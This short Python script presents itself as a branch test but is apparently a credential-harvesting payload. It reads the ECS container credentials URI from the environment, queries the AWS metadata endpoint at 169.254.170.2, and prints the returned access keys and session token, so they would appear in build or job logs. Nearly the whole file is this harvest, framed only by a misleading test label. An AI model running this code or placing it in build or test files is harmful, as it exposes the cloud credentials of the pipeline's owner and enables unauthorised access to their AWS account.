import os
import requests

# Test
print("yooo")
print("[!] Testing branch:dev")
uri=os.getenv("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
text = requests.get("http://169.254.170.2/"+uri)
print(text.text)
